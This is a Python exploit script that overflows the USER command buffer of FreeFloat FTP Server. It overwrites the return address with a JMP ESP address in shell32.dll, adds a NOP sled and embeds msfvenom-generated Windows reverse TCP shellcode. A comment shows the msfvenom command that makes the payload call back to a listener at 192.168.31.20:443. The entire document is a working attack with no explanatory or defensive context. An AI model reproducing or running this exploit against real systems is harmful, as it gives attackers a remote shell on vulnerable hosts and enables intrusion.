#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Hyjack shell32.dll JMP ESP memory 7CB41020
#msfvenom -p windows/shell_reverse_tcp lhost=192.168.31.20 lport=443 -b "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d" -f c
shell=("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xad\x8c\xec\x17\x83\xee\xfc\xe2\xf4\x51\x64\x6e\x17\xad\x8c"
"\x8c\x9e\x48\xbd\x2c\x73\x26\xdc\xdc\x9c\xff\x80\x67\x45\xb9"
"\x07\x9e\x3f\xa2\x3b\xa6\x31\x9c\x73\x40\x2b\xcc\xf0\xee\x3b"
"\x8d\x4d\x23\x1a\xac\x4b\x0e\xe5\xff\xdb\x67\x45\xbd\x07\xa6"
"\x2b\x26\xc0\xfd\x6f\x4e\xc4\xed\xc6\xfc\x07\xb5\x37\xac\x5f"
"\x67\x5e\xb5\x6f\xd6\x5e\x26\xb8\x67\x16\x7b\xbd\x13\xbb\x6c"
"\x43\xe1\x16\x6a\xb4\x0c\x62\x5b\x8f\x91\xef\x96\xf1\xc8\x62"
"\x49\xd4\x67\x4f\x89\x8d\x3f\x71\x26\x80\xa7\x9c\xf5\x90\xed"
"\xc4\x26\x88\x67\x16\x7d\x05\xa8\x33\x89\xd7\xb7\x76\xf4\xd6"
"\xbd\xe8\x4d\xd3\xb3\x4d\x26\x9e\x07\x9a\xf0\xe4\xdf\x25\xad"
"\x8c\x84\x60\xde\xbe\xb3\x43\xc5\xc0\x9b\x31\xaa\x73\x39\xaf"
"\x3d\x8d\xec\x17\x84\x48\xb8\x47\xc5\xa5\x6c\x7c\xad\x73\x39"
"\x47\xfd\xdc\xbc\x57\xfd\xcc\xbc\x7f\x47\x83\x33\xf7\x52\x59"
"\x7b\x7d\xa8\xe4\x2c\xbf\xb2\x98\x84\x15\xad\x8d\x57\x9e\x4b"
"\xe6\xfc\x41\xfa\xe4\x75\xb2\xd9\xed\x13\xc2\x28\x4c\x98\x1b"
"\x52\xc2\xe4\x62\x41\xe4\x1c\xa2\x0f\xda\x13\xc2\xc5\xef\x81"
"\x73\xad\x05\x0f\x40\xfa\xdb\xdd\xe1\xc7\x9e\xb5\x41\x4f\x71"
"\x8a\xd0\xe9\xa8\xd0\x16\xac\x01\xa8\x33\xbd\x4a\xec\x53\xf9"
"\xdc\xba\x41\xfb\xca\xba\x59\xfb\xda\xbf\x41\xc5\xf5\x20\x28"
"\x2b\x73\x39\x9e\x4d\xc2\xba\x51\x52\xbc\x84\x1f\x2a\x91\x8c"
"\xe8\x78\x37\x1c\xa2\x0f\xda\x84\xb1\x38\x31\x71\xe8\x78\xb0"
"\xea\x6b\xa7\x0c\x17\xf7\xd8\x89\x57\x50\xbe\xfe\x83\x7d\xad"
"\xdf\x13\xc2")
buffer = "A"*230 + "\x20\x10\xB4\x7C" + "\x90" * 30+shell
s.connect(('192.168.31.138',21))
data = s.recv(1024)
print ("Sending data to FreeFloat Server...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.close()
print ("Finish")

